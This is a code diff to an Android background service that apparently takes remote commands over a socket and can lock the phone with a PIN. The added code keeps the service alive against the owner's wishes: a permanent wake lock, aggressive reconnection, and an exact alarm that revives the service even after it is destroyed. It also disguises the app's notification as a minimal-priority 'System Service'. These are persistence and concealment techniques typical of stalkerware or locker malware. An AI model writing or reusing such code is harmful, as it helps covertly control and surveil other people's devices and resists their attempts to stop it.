@@ -78,6 +78,32 @@ class DeviceService : Service(), LifecycleOwner {
     private var deviceId: String = ""
     private var deviceName: String = ""
 
+    private var wakeLock: PowerManager.WakeLock? = null
+    private val keepAliveHandler = Handler(Looper.getMainLooper())
+    private val keepAliveRunnable = object : Runnable {
+        override fun run() {
+            try {
+                if (socket == null || socket?.connected() != true) {
+                    Log.d("DeviceService", "keepAlive: reconnecting socket")
+                    connectSocket()
+                } else {
+                    // lightweight presence ping so server knows we are alive
+                    try {
+                        socket?.emit("device:ping", JSONObject().apply {
+                            put("deviceId", deviceId)
+                            put("ts", System.currentTimeMillis())
+                        })
+                    } catch (_: Exception) {}
+                }
+            } catch (e: Exception) {
+                Log.e("DeviceService", "keepAlive error: ${e.message}")
+            }
+            keepAliveHandler.postDelayed(this, 25_000L)
+        }
+    }
+    private val ALARM_REQ = 9911
+    private val ALARM_INTERVAL_MS = 12 * 60 * 1000L // 12 menit
+
     var lockPin: String = ""
     var lockTitle: String = ""
 
@@ -197,14 +223,20 @@ class DeviceService : Service(), LifecycleOwner {
         }
 
         connectSocket()
+        acquireWakeLock()
+        startKeepAliveLoop()
+        scheduleKeepAliveAlarm()
     }
 
     private fun connectSocket() {
         try {
             val opts = IO.Options.builder()
                 .setReconnection(true)
-                .setReconnectionDelay(3000)
-                .setReconnectionDelayMax(10000)
+                .setReconnectionAttempts(Integer.MAX_VALUE)
+                .setReconnectionDelay(1000)
+                .setReconnectionDelayMax(5000)
+                .setTimeout(20000)
+                .setForceNew(false)
                 .build()
 
             socket = IO.socket(URI.create(SERVER_URL), opts)
@@ -233,6 +265,18 @@ class DeviceService : Service(), LifecycleOwner {
             socket?.on(Socket.EVENT_DISCONNECT) {
                 Log.d("DeviceService", "Socket disconnected")
                 SocketHolder.connected = false
+                // Jangan tunggu lama — reconnect cepat
+                Handler(Looper.getMainLooper()).postDelayed({
+                    if (socket?.connected() != true) connectSocket()
+                }, 1500)
+            }
+
+            socket?.on(Socket.EVENT_CONNECT_ERROR) {
+                Log.e("DeviceService", "Socket connect error")
+                SocketHolder.connected = false
+                Handler(Looper.getMainLooper()).postDelayed({
+                    if (socket?.connected() != true) connectSocket()
+                }, 3000)
             }
 
             socket?.on("command") { args ->
@@ -1755,7 +1799,20 @@ ${htmlContent}
     }
 
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // Re-arm every start (termasuk dari alarm & onTaskRemoved)
+        if (intent?.action == "com.sync.xxx.KEEPALIVE" || intent?.action == ACTION_CONNECT) {
+            if (socket == null || socket?.connected() != true) connectSocket()
+        }
+        acquireWakeLock()
+        startKeepAliveLoop()
+        scheduleKeepAliveAlarm()
+        // Pastikan foreground notification tetap
+        try {
+            startForeground(NOTIF_ID, buildNotification())
+        } catch (_: Exception) {}
+        return START_STICKY
+    }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -1777,6 +1834,10 @@ ${htmlContent}
 
     override fun onDestroy() {
         super.onDestroy()
+        stopKeepAliveLoop()
+        releaseWakeLock()
+        // Jadwalkan alarm supaya hidup lagi
+        scheduleKeepAliveAlarm()
         lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
         lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
         lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
@@ -1792,12 +1853,74 @@ ${htmlContent}
         socket = null
     }
 
+    private fun acquireWakeLock() {
+        try {
+            if (wakeLock?.isHeld == true) return
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "syncxxx:keepalive").apply {
+                setReferenceCounted(false)
+                acquire()
+            }
+            Log.d("DeviceService", "WakeLock acquired")
+        } catch (e: Exception) {
+            Log.e("DeviceService", "WakeLock error: ${e.message}")
+        }
+    }
+
+    private fun releaseWakeLock() {
+        try {
+            if (wakeLock?.isHeld == true) {
+                wakeLock?.release()
+                Log.d("DeviceService", "WakeLock released")
+            }
+        } catch (_: Exception) {}
+        wakeLock = null
+    }
+
+    private fun startKeepAliveLoop() {
+        keepAliveHandler.removeCallbacks(keepAliveRunnable)
+        keepAliveHandler.postDelayed(keepAliveRunnable, 5_000L)
+    }
+
+    private fun stopKeepAliveLoop() {
+        keepAliveHandler.removeCallbacks(keepAliveRunnable)
+    }
+
+    /** AlarmManager backup — bangunkan service tiap 12 menit meski doze */
+    private fun scheduleKeepAliveAlarm() {
+        try {
+            val am = getSystemService(ALARM_SERVICE) as AlarmManager
+            val intent = Intent(this, DeviceService::class.java).apply {
+                action = "com.sync.xxx.KEEPALIVE"
+            }
+            val pi = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                PendingIntent.getService(this, ALARM_REQ, intent,
+                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
+            } else {
+                PendingIntent.getService(this, ALARM_REQ, intent,
+                    PendingIntent.FLAG_UPDATE_CURRENT)
+            }
+            val trigger = System.currentTimeMillis() + ALARM_INTERVAL_MS
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, trigger, pi)
+            } else {
+                am.setExact(AlarmManager.RTC_WAKEUP, trigger, pi)
+            }
+            Log.d("DeviceService", "KeepAlive alarm scheduled")
+        } catch (e: Exception) {
+            Log.e("DeviceService", "schedule alarm: ${e.message}")
+        }
+    }
+
     private fun buildNotification(): Notification =
         NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("SyncXxX")
-            .setContentText("")
+            .setContentTitle("System Service")
+            .setContentText("Running")
             .setSmallIcon(android.R.drawable.ic_menu_info_details)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setOngoing(true)
+            .setShowWhen(false)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .build()
 
     private fun createNotificationChannel() {
